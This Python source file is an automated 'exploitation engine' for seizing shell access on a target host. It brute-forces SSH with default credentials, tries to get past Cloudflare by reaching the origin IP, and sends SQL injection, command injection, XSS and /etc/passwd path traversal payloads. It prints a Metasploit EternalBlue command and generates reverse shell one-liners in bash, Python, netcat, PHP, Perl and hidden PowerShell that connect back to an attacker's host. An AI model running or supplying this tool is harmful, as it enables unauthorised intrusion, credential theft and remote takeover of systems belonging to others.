#!/usr/bin/env python3
"""
Real Exploitation Engine - Initial Access & Shell Acquisition
SSH Brute Force, Web Exploitation, Auto Shell
"""

import subprocess
import socket
import requests
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass

from modules.waf_bypass import WAFBypass


@dataclass
class ExploitResult:
    """Exploitation result"""
    success: bool
    method: str
    target: str
    shell_type: str = ""
    credentials: str = ""
    payload: str = ""
    error: str = ""


class RealExploitationEngine:
    """Real exploitation for initial access"""
    
    def __init__(self):
        self.successful_exploits = []
        self.waf = WAFBypass()
        
    def auto_get_shell(self, target: str) -> ExploitResult:
        """Try multiple methods to get shell access"""
        print(f"[*] Target: {target}")
        print(f"[*] Attempting automated shell acquisition...")
        
        host = target.split(':')[0]
        web_ports = self._detect_web_ports(host)
        if web_ports:
            print(f"[*] Reachable web ports: {', '.join(map(str, web_ports))}")
        else:
            print("[*] No obvious web ports detected (80/443/8080/8443) - will still probe default URLs")
        
        methods = [
            ('SSH Brute Force', lambda: self._try_ssh_brute(host)),
            ('Web Exploitation', lambda: self._try_web_exploits(host, web_ports)),
            ('Common Vulnerabilities', lambda: self._try_common_vulns(host)),
            ('Service Exploits', lambda: self._try_service_exploits(host)),
        ]
        
        for method_name, method_func in methods:
            print(f"\n[*] Trying: {method_name}")
            result = method_func()
            if result.success:
                print(f"[+] SUCCESS! Got shell via {method_name}")
                return result
            print(f"[-] {method_name} failed")
        
        return ExploitResult(
            success=False,
            method="auto",
            target=target,
            error="All exploitation methods failed"
        )
    
    def _is_port_open(self, host: str, port: int, timeout: int = 2) -> bool:
        """Check if TCP port is reachable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception:
            return False

    def _detect_web_ports(self, host: str) -> List[int]:
        """Detect reachable web ports to prioritize web exploitation"""
        candidate_ports = [443, 8443, 80, 8080, 8000, 8888, 5000, 3000]
        open_ports = [port for port in candidate_ports if self._is_port_open(host, port)]
        return open_ports

    def _try_ssh_brute(self, host: str) -> ExploitResult:
        """Try SSH brute force with common credentials"""
        common_creds = [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', ''),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('user', 'user'),
        ]
        
        # Pre-flight: ensure port 22 is reachable before brute forcing
        if not self._is_port_open(host, 22):
            return ExploitResult(False, "ssh_brute", host, error="SSH port not open")

        for username, password in common_creds:
            try:
                # Try SSH login (requires sshpass)
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{host} 'echo SUCCESS'"
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                
                if 'SUCCESS' in proc.stdout:
                    return ExploitResult(
                        success=True,
                        method="ssh_brute",
                        target=host,
                        shell_type="ssh",
                        credentials=f"{username}:{password}"
                    )
            except:
                pass
        
        return ExploitResult(False, "ssh_brute", host, error="No valid credentials found")
    
    def _build_web_urls(self, host: str, ports: Optional[List[int]]) -> List[str]:
        """Build URLs from reachable ports with sane defaults"""
        if ports:
            port_list = ports
        else:
            port_list = [80, 443, 8080, 8443, 8000]
        urls = []
        for port in port_list:
            scheme = "https" if port in [443, 8443] else "http"
            default_port = (scheme == "http" and port == 80) or (scheme == "https" and port == 443)
            port_segment = "" if default_port else f":{port}"
            urls.append(f"{scheme}://{host}{port_segment}")
        return urls

    def _safe_get(self, url: str, host_header: Optional[str] = None) -> Optional[requests.Response]:
        """Wrapper around requests.get with optional Host header and TLS skip"""
        try:
            headers = {'Host': host_header} if host_header else None
            return requests.get(url, headers=headers, timeout=5, verify=False)
        except Exception:
            return None

    def _try_web_exploits(self, host: str, web_ports: Optional[List[int]] = None) -> ExploitResult:
        """Try common web exploits with WAF/CDN bypass support"""
        urls = self._build_web_urls(host, web_ports)
        tested = set()
        
        for url in urls:
            if url in tested:
                continue
            tested.add(url)
            print(f"[*] Probing {url}")

            # Detect and try to bypass WAF/CDN (Cloudflare, etc.)
            waf_info = self.waf.detect_waf(url)
            working_url = url
            host_header = None

            if waf_info.name == "Cloudflare":
                bypass_result = self.waf.bypass_cloudflare(url)
                if bypass_result.get("working_url"):
                    working_url = bypass_result["working_url"]
                    print(f"[+] Using bypassed URL: {working_url}")
                elif waf_info.real_ip:
                    # Fall back to origin IP with Host header
                    parsed_port = working_url.split(":")[-1] if ":" in working_url.split("//", 1)[1] else ""
                    port_suffix = f":{parsed_port}" if parsed_port and parsed_port.isdigit() else ""
                    working_url = working_url.split("://")[0] + f"://{waf_info.real_ip}{port_suffix}"
                    host_header = host
                    print(f"[*] Trying origin IP: {working_url} with Host header {host}")

            # Test for SQL Injection
            sqli_payloads = ["' OR '1'='1", "admin'--", "1' OR '1'='1'--"]
            for payload in sqli_payloads:
                test_url = f"{working_url}/login?user={payload}&pass={payload}"
                resp = self._safe_get(test_url, host_header)
                if resp and ('admin' in resp.text.lower() or 'dashboard' in resp.text.lower()):
                    return ExploitResult(
                        success=True,
                        method="sqli",
                        target=host,
                        shell_type="web_shell",
                        payload=payload
                    )

            # Test for RCE / command injection
            rce_payloads = [
                "; id",
                "| whoami",
                "$(whoami)",
                "`id`"
            ]
            for payload in rce_payloads:
                test_url = f"{working_url}/?cmd={payload}"
                resp = self._safe_get(test_url, host_header)
                if resp and ('uid=' in resp.text or 'root' in resp.text):
                    return ExploitResult(
                        success=True,
                        method="rce",
                        target=host,
                        shell_type="command_injection",
                        payload=payload
                    )

        return ExploitResult(False, "web_exploits", host, error="No web vulnerabilities found or WAF blocked requests")
    
    def _try_common_vulns(self, host: str) -> ExploitResult:
        """Try common CVEs"""
        # Check for EternalBlue (MS17-010)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((host, 445))
            sock.close()
            
            if result == 0:
                # SMB port open, could be vulnerable to EternalBlue
                print("[*] SMB port 445 open - potential EternalBlue target")
                return ExploitResult(
                    success=False,
                    method="eternalblue",
                    target=host,
                    error="Use: msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {host}; run'"
                )
        except:
            pass
        
        return ExploitResult(False, "common_vulns", host, error="No common vulns detected")
    
    def _try_service_exploits(self, host: str) -> ExploitResult:
        """Try service-specific exploits"""
        # Scan common ports
        services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            80: 'HTTP',
            443: 'HTTPS',
            3306: 'MySQL',
            5432: 'PostgreSQL',
            6379: 'Redis',
            27017: 'MongoDB',
        }
        
        open_services = []
        for port, service_name in services.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((host, port))
                sock.close()
                
                if result == 0:
                    open_services.append((port, service_name))
            except:
                pass
        
        if open_services:
            print(f"[*] Open services: {', '.join([f'{s}:{p}' for p,s in open_services])}")
        
        return ExploitResult(False, "service_exploits", host, error=f"Found {len(open_services)} open services")
    
    def ssh_brute_force(self, target: str, wordlist: Optional[str] = None) -> ExploitResult:
        """SSH brute force attack"""
        # Parse target
        if '@' in target:
            username, host = target.split('@')
        else:
            username = 'root'
            host = target
        
        print(f"[*] SSH Brute Force Attack")
        print(f"[*] Target: {username}@{host}")
        
        # Default wordlist if not provided
        if not wordlist:
            passwords = [
                '', 'root', 'toor', 'admin', 'password', '123456', 
                'password123', 'admin123', 'root123', 'letmein',
                'welcome', 'monkey', 'dragon', 'master', 'qwerty'
            ]
        else:
            try:
                with open(wordlist, 'r') as f:
                    passwords = [line.strip() for line in f]
            except:
                return ExploitResult(False, "ssh_brute", host, error="Cannot read wordlist")
        
        print(f"[*] Trying {len(passwords)} passwords...")
        
        for i, password in enumerate(passwords, 1):
            try:
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 {username}@{host} 'echo SUCCESS' 2>/dev/null"
                proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if 'SUCCESS' in proc.stdout:
                    print(f"\n[+] FOUND! {username}:{password}")
                    return ExploitResult(
                        success=True,
                        method="ssh_brute",
                        target=host,
                        shell_type="ssh",
                        credentials=f"{username}:{password}"
                    )
                
                if i % 5 == 0:
                    print(f"[*] Tried {i}/{len(passwords)} passwords...")
            except:
                pass
        
        return ExploitResult(False, "ssh_brute", host, error="No valid password found")
    
    def web_exploit(self, url: str) -> Dict:
        """Comprehensive web exploitation"""
        print(f"[*] Web Exploitation Scanner")
        print(f"[*] Target: {url}")
        
        vulnerabilities = {
            'sqli': [],
            'xss': [],
            'rce': [],
            'lfi': [],
            'path_traversal': []
        }
        
        # SQL Injection
        print("\n[*] Testing SQL Injection...")
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL--",
        ]
        for payload in sqli_payloads:
            try:
                resp = requests.get(f"{url}?id={payload}", timeout=5, verify=False)
                if 'error' not in resp.text.lower() and len(resp.text) > 0:
                    vulnerabilities['sqli'].append(payload)
                    print(f"  [+] Potential SQLi: {payload}")
            except:
                pass
        
        # XSS
        print("\n[*] Testing XSS...")
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        for payload in xss_payloads:
            try:
                resp = requests.get(f"{url}?search={payload}", timeout=5, verify=False)
                if payload in resp.text:
                    vulnerabilities['xss'].append(payload)
                    print(f"  [+] XSS vulnerable: {payload}")
            except:
                pass
        
        # RCE
        print("\n[*] Testing RCE...")
        rce_payloads = [
            "; id",
            "| whoami",
            "$(whoami)",
            "`id`"
        ]
        for payload in rce_payloads:
            try:
                resp = requests.get(f"{url}?cmd={payload}", timeout=5, verify=False)
                if 'uid=' in resp.text or 'root' in resp.text:
                    vulnerabilities['rce'].append(payload)
                    print(f"  [+] RCE vulnerable: {payload}")
            except:
                pass
        
        # Path Traversal / LFI
        print("\n[*] Testing Path Traversal/LFI...")
        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
        ]
        for payload in lfi_payloads:
            try:
                resp = requests.get(f"{url}?file={payload}", timeout=5, verify=False)
                if 'root:' in resp.text:
                    vulnerabilities['lfi'].append(payload)
                    print(f"  [+] LFI vulnerable: {payload}")
            except:
                pass
        
        total_vulns = sum(len(v) for v in vulnerabilities.values())
        print(f"\n[*] Found {total_vulns} vulnerabilities")
        
        return vulnerabilities
    
    def generate_reverse_shell(self, lhost: str, lport: int) -> Dict[str, str]:
        """Generate reverse shell payloads"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        }
        
        return payloads
